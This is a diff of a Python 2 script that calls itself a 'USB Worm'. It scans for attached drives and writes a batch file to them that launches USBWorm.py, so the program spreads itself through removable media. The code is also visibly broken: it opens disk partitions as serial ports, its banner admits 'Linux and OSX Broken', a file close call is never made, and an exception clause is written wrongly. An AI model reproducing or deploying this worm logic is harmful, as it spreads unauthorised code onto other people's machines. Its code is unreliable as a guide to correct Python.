@@ -1,23 +1,35 @@
-import os, time
+import os, time, serial
+from serial import SerialException
 from datetime import datetime
 startTime = time.time()
 print """''''''''''''''''''''''''''''''
 ' USB Worm for Python Sample '
 ''''''''''''''''''''''''''''''
 '                            '
-'   Testing Version 0.06     '
+'   Testing Version 0.07     '
 '                            '
 ''''''''''''''''''''''''''''''
 '   For Windows, OSX, Linux  '
+''''''''''''''''''''''''''''''
+'   Linux and OSX Broken     '
 ''''''''''''''''''''''''''''''"""
 #Simple USB Worm#
+
 time.sleep(6)
 def USBDetect():
 	global textfile
 	if os.name == 'posix':
 		print "Found Unix, Linux, OSX, or Other POSIX System...\n"
-		USBDir = ['/dev/sdb1', '/dev/sdb2', '/dev/sdb3', '/dev/sdc1', '/dev/sdc2', '/dev/sdc3']
-		textfile = "\text.txt"
+		try:
+			textfile = "\text.txt"
+			USBDir = [serial.Serial('/dev/sdb1'), serial.Serial('/dev/sdb2'), serial.Serial('/dev/sdb3'), serial.Serial('/dev/sdc1'), serial.Serial('/dev/sdc2'), serial.Serial('/dev/sdc3')]
+		except SerialException:
+			Error = True
+			print "Permission Error"
+			if Error == True:
+				finished = time.time() - startTime
+				print "Time to execute worm: %s" % finished
+				exit()
 	else:
 		if os.name == 'nt':
 			print "Found Windows...\n"
@@ -29,13 +41,16 @@ def USBDetect():
 	USBList = []
 	while lencount >= 0:
 		time.sleep(2)
-		if os.path.exists(USBDir[lencount]):
-			USBList.append(USBDir[lencount])
-			print "Found %s\n" % USBDir[lencount]
-			lencount -= 1
-		else:
-			print "No USB Detected"
-			lencount -= 1
+		try:
+			if os.path.exists(USBDir[lencount]):
+				USBList.append(USBDir[lencount])
+				print "Found %s\n" % USBDir[lencount]
+				lencount -= 1
+			else:
+				print "No USB Detected"
+				lencount -= 1
+		except serial.serialutil.SerialException or IOError:
+			print ""
 USBDetect()
 print "\nUSB's Detected: %s\n" % USBList
 
@@ -76,7 +91,7 @@ def WinBat():
 			if os.name == 'nt':
 				fp = open(batch, 'w+')
 				time.sleep(1)
-				command = "start C:\Python27\python.exe __FILE__"
+				command = "start C:\Python27\python.exe USBWorm.py"
 				fp.write(command)
 				fp.close
 				USBCount -= 1
